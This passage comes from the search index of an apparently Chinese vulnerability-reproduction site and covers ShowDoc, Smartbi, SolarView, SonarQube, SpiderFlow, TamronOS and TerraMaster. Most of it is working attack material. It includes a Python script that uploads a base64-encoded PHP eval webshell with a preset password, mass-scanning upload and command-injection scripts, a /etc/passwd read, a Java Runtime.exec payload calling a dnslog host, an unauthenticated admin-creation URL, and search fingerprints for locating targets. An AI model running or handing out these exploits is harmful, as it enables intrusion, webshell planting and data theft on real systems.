print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/index.php?s=/home/page/uploadImg\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\", \"Content-Type\": \"multipart/form-data; boundary=--------------------------921378126371623762173617\" } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTkyMTM3ODEyNjM3MTYyMzc2MjE3MzYxNwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImVkaXRvcm1kLWltYWdlLWZpbGUiOyBmaWxlbmFtZT0idGVzdC48PnBocCIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocCBlY2hvICd0ZXN0X3Rlc3QnO0BldmFsKCRfUE9TVFt0ZXN0XSk/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOTIxMzc4MTI2MzcxNjIzNzYyMTczNjE3LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"success\" in response.text and response.status_code == 200: webshell_url = re.findall(r'\"url\":\"(.*?)\"', response.text)[0] webshell_url = webshell_url.replace('\\\\','') response = requests.get(url=webshell_url, headers=headers,verify=False, timeout=5) if \"test_test\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功上传木马 \\n[o] 路径为 {}\\033[0m\".format(target_url, webshell_url)) print(\"\\033[32m[o] 密码为: peiqi \\033[0m\") else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) else: print(\"\\033[31m[x] 上传失败 \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/showdoc-pagecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/showdoc-pagecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"ShowDoc 前台文件上传漏洞 ","date":"0001-01-01","objectID":"/showdoc-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/showdoc-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 参考链接： https://github.com/star7th/showdoc/pull/1059 ","date":"0001-01-01","objectID":"/showdoc-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/showdoc-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"ShowDoc\" ","date":"0001-01-01","objectID":"/showdoc-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/showdoc-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 poc： POST /server/index.php?s=/home/page/uploading HTTP/1.1 上传图片，并抓包，将文件名改为plzmyy.\u003c\u003ephp import requests requests.packages.urllib3.disable_warnings() test = open('url.txt',\"r\") for host in test.readlines(): url = host+\"/server/index.php?s=/home/page/uploading\" payload = \"\"\"------WebKitFormBoundary5j2IsrTFPjJCVtwU Content - Disposition: form - data;name = \"editormd-image-file\";filename = \"plzmyy.\u003c\u003ephp\" Content - Type: text / plain 123123test ------WebKitFormBoundary5j2IsrTFPjJCVtwU - -\"\"\" headers = { \"Cookie\": \"PHPSESSID=shp3gipo9moaj58kp9n8sbi4f1; think_language=zh-CN; cookie_token=8ff04b9bba8b6abf30ab5e0be6cceea2192c9cf7a90d73b2d34d025d84feea2d\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Connection\": \"close\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\", \"Sec-Fetch-Site\": \"same-origin\", \"Sec-Fetch-Dest\": \"iframe\", \"Accept-Encoding\": \"gzip, deflate\", \"Sec-Fetch-Mode\": \"navigate\", \"sec-ch-ua\": \"\\\"Google Chrome\\\";v=\\\"87\\\", \\\" Not;A Brand\\\";v=\\\"99\\\", \\\"Chromium\\\";v=\\\"87\\\"\", \"sec-ch-ua-mobile\": \"?0\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\", \"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Content-Length\": \"212\", \"Content-Type\": \"multipart/form-data; boundary=----WebKitFormBoundary5j2IsrTFPjJCVtwU\" } try: response = requests.request(\"POST\", url, data=payload, headers=headers, verify=False, timeout=5) except: continue if response.text in 'success': print(response.text) ","date":"0001-01-01","objectID":"/showdoc-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/showdoc-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Smartbi RMIServlet 登陆绕过漏洞 ","date":"0001-01-01","objectID":"/smartbi-rmiservlet-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/smartbi-rmiservlet-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 该漏洞源于 Smartbi 默认存在内置用户，在使用特定接口时，攻击者可绕过用户身份认证机制获取内置用户身份凭证，随后可使用获取的身份凭证调用后台接口，最终可能导致敏感信息泄露和代码执行。 ","date":"0001-01-01","objectID":"/smartbi-rmiservlet-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/smartbi-rmiservlet-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 V7 \u003c= Smartbi \u003c=V10 ","date":"0001-01-01","objectID":"/smartbi-rmiservlet-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/smartbi-rmiservlet-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"SMARTBI\" ","date":"0001-01-01","objectID":"/smartbi-rmiservlet-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/smartbi-rmiservlet-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 验证漏洞是否存在 http://your-ip/smartbi/vision/RMIServlet 出现以下回显证明漏洞存在 {\"retCode\":\"CLIENT_USER_NOT_LOGIN\",\"result\":\"尚未登录或会话过期\"} poc POST /smartbi/vision/RMIServlet HTTP/1.1 Host: your-ip Content-Type: application/x-www-form-urlencoded className=UserService\u0026methodName=loginFromDB\u0026params=[\"system\",\"0a\"] 通过获取的Cookie登陆。 ","date":"0001-01-01","objectID":"/smartbi-rmiservlet-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/smartbi-rmiservlet-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞修复 官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本：https://www.smartbi.com.cn/patchinfo ","date":"0001-01-01","objectID":"/smartbi-rmiservlet-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/smartbi-rmiservlet-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Smartbi 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/smartbi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/smartbi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Smartbi 大数据分析平台存在远程命令执行漏洞，未经身份认证的远程攻击者可利用 stub 接口构造请求绕过补丁限制，进而控制 JDBC URL，最终可导致远程代码执行或信息泄露。 ","date":"0001-01-01","objectID":"/smartbi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/smartbi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 v7 \u003c= Smartbi \u003c= v10.5.8 ","date":"0001-01-01","objectID":"/smartbi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/smartbi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 POST /smartbi/vision/RMIServlet?windowUnloading=\u0026%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a% ","date":"0001-01-01","objectID":"/smartbi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/smartbi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞修复 目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://www.smartbi.com.cn/patchinfo ","date":"0001-01-01","objectID":"/smartbi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/smartbi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"SolarView Compact 命令注入漏洞 CVE-2022-40881 ","date":"0001-01-01","objectID":"/solarview-compact-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-40881/:0:0","tags":null,"title":"","uri":"/solarview-compact-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-40881/"},{"categories":null,"content":"漏洞描述 Contec SolarView Compact是日本Contec公司的一个应用系统。提供光伏发电测量系统。Contec SolarView Compact 6.00版本存在安全漏洞，攻击者利用该漏洞可以通过 network_test.php 的命令注入攻击。 ","date":"0001-01-01","objectID":"/solarview-compact-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-40881/:1:0","tags":null,"title":"","uri":"/solarview-compact-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-40881/"},{"categories":null,"content":"漏洞影响 SolarView Compact 6.00 ","date":"0001-01-01","objectID":"/solarview-compact-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-40881/:2:0","tags":null,"title":"","uri":"/solarview-compact-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-40881/"},{"categories":null,"content":"网络测绘 body=\"SolarView Compact\" \u0026\u0026 title==\"Top\" ","date":"0001-01-01","objectID":"/solarview-compact-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-40881/:3:0","tags":null,"title":"","uri":"/solarview-compact-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-40881/"},{"categories":null,"content":"漏洞复现 发送数据包： POST /cgi-bin/network_test.php HTTP/1.1 Host: x.x.x.x Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.97 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 44 host=%0acat${IFS}/etc/passwd%0a\u0026command=ping ","date":"0001-01-01","objectID":"/solarview-compact-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-40881/:4:0","tags":null,"title":"","uri":"/solarview-compact-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-40881/"},{"categories":null,"content":"漏洞POC import sys import requests import argparse def poc_scan(url): try: url = url + \"/network_test.php\" response = requests.post(url,data = \"host=%0acat${IFS}/etc/passwd%0a\u0026command=ping\",timeout=2) if response.status_code == 200: print(f\"\\033[92m[+] {url} is vulnerable!\\033[0m\") else: print(f\"\\033[31m[-] {url} is not vulnerable!\\033[0m\") except: pass def open_file(filename): with open(filename, 'r', encoding='utf-8') as f: filecontent = f.read() return filecontent if __name__ == \"__main__\": parser = argparse.ArgumentParser() parser.add_argument(\"-u\", \"--url\") parser.add_argument(\"-f\", \"--file\") args = parser.parse_args() url = args.url filename = args.file if sys.argv[1] == '-u': poc_scan(url) else: filecontent = open_file(filename) filecontent = filecontent.split(\"\\n\") for i in filecontent: poc_scan(i) ","date":"0001-01-01","objectID":"/solarview-compact-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-40881/:5:0","tags":null,"title":"","uri":"/solarview-compact-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-40881/"},{"categories":null,"content":"修复建议 目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://www.contec.com/products-services/environmental-monitoring/solarview/ ","date":"0001-01-01","objectID":"/solarview-compact-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-40881/:6:0","tags":null,"title":"","uri":"/solarview-compact-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-40881/"},{"categories":null,"content":"SonarQube search_projects 项目信息泄露漏洞 ","date":"0001-01-01","objectID":"/sonarqube-search_projects-%E9%A1%B9%E7%9B%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/sonarqube-search_projects-%E9%A1%B9%E7%9B%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 SonarQube 某接口存在信息泄露漏洞，可以通过工具下载源码 ","date":"0001-01-01","objectID":"/sonarqube-search_projects-%E9%A1%B9%E7%9B%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/sonarqube-search_projects-%E9%A1%B9%E7%9B%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 SonarQube ","date":"0001-01-01","objectID":"/sonarqube-search_projects-%E9%A1%B9%E7%9B%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/sonarqube-search_projects-%E9%A1%B9%E7%9B%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"sonarQube-代码管理\" ","date":"0001-01-01","objectID":"/sonarqube-search_projects-%E9%A1%B9%E7%9B%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/sonarqube-search_projects-%E9%A1%B9%E7%9B%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页如下 漏洞POC http://xxx.xxx.xxx.xxx/api/components/search_projects 可通过工具下载项目中的源代码 https://github.com/deletescape/sloot ","date":"0001-01-01","objectID":"/sonarqube-search_projects-%E9%A1%B9%E7%9B%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/sonarqube-search_projects-%E9%A1%B9%E7%9B%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"SonarQube values 信息泄露漏洞 CVE-2020-27986 ","date":"0001-01-01","objectID":"/sonarqube-values-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-27986/:0:0","tags":null,"title":"","uri":"/sonarqube-values-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-27986/"},{"categories":null,"content":"漏洞描述 SonarQube 某接口存在信息泄露漏洞，可以获取部分敏感信息 ","date":"0001-01-01","objectID":"/sonarqube-values-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-27986/:1:0","tags":null,"title":"","uri":"/sonarqube-values-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-27986/"},{"categories":null,"content":"漏洞影响 SonarQube ","date":"0001-01-01","objectID":"/sonarqube-values-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-27986/:2:0","tags":null,"title":"","uri":"/sonarqube-values-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-27986/"},{"categories":null,"content":"网络测绘 app=\"sonarQube-代码管理\" ","date":"0001-01-01","objectID":"/sonarqube-values-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-27986/:3:0","tags":null,"title":"","uri":"/sonarqube-values-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-27986/"},{"categories":null,"content":"漏洞复现 主页如下 漏洞POC http://xxx.xxx.xxx.xxx/api/settings/values 可泄露的为：明文SMTP、SVN和Gitlab等敏感信息 ","date":"0001-01-01","objectID":"/sonarqube-values-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-27986/:4:0","tags":null,"title":"","uri":"/sonarqube-values-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-27986/"},{"categories":null,"content":"SpiderFlow save 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/spiderflow-save-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/spiderflow-save-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 SpiderFlow 平台以流程图的⽅式定义爬虫，是⼀个高度灵活可配置的爬虫平台 官⽹：https://www.spiderflow.org/ ","date":"0001-01-01","objectID":"/spiderflow-save-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/spiderflow-save-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 SpiderFlow ","date":"0001-01-01","objectID":"/spiderflow-save-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/spiderflow-save-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title==\"SpiderFlow\" ","date":"0001-01-01","objectID":"/spiderflow-save-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/spiderflow-save-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页面 发送请求包执行命令 POST /function/save id=\u0026name=cmd\u0026parameter=yw\u0026script=}Java.type('java.lang.Runtime').getRuntime().exec('ping chwd71.dnslog.cn');{ ","date":"0001-01-01","objectID":"/spiderflow-save-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/spiderflow-save-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"TamronOS IPTV系统 ping 任意命令执行漏洞 ","date":"0001-01-01","objectID":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-ping-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-ping-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 TamronOS IPTV系统 api/ping 存在任意命令执行漏洞，攻击者通过漏洞可以执行任意命令 ","date":"0001-01-01","objectID":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-ping-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-ping-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 TamronOS IPTV系统 ","date":"0001-01-01","objectID":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-ping-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-ping-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"TamronOS-IPTV系统\" ","date":"0001-01-01","objectID":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-ping-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-ping-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 漏洞POC为 /api/ping?count=5\u0026host=;id; ","date":"0001-01-01","objectID":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-ping-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-ping-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"TamronOS IPTV系统 submit 任意用户创建漏洞 ","date":"0001-01-01","objectID":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-submit-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-submit-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 TamronOS IPTV系统 /api/manager/submit 存在任意用户创建漏洞，攻击者通过漏洞可以任意用户创建进入后台 ","date":"0001-01-01","objectID":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-submit-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-submit-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 TamronOS IPTV系统 ","date":"0001-01-01","objectID":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-submit-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-submit-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"TamronOS-IPTV系统\" ","date":"0001-01-01","objectID":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-submit-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-submit-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 漏洞POC为 /api/manager/submit?group=1\u0026username=test\u0026password=123456 user: test pass: 123456 ","date":"0001-01-01","objectID":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-submit-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/tamronos-iptv%E7%B3%BB%E7%BB%9F-submit-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"TerraMaster TOS createRaid 远程命令执行漏洞 CVE-2022-24989 ","date":"0001-01-01","objectID":"/terramaster-tos-createraid-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24989/:0:0","tags":null,"title":"","uri":"/terramaster-tos-createraid-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24989/"},{"categories":null,"content":"漏洞描述 TerraMaster TOS mobile.class.php文件的createRaid方法存在远程命令执行漏洞 ，攻击者配合 CVE-2022-24990漏洞可以获取服务器权限 